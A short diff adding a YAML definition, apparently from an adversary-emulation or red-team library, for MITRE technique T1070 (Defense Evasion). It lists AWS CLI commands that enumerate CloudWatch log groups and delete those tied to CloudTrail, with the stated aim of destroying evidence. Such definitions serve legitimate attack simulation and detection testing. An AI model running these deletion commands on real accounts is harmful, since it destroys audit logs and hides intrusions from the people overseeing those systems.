@@ -1,0 +1,9 @@
+name: Delete CloudTrail Log Groups in CloudWatch
+description: Removes CloudWatch Log Groups linked to CloudTrail to destroy evidence.
+mitre_technique: T1070
+stage: Defense Evasion
+steps:
+  - action: aws logs describe-log-groups --query 'logGroups[*].logGroupName'
+    description: List all CloudWatch Log Groups
+  - action: aws logs delete-log-group --log-group-name <log-group-name>
+    description: Delete suspicious or relevant log groups
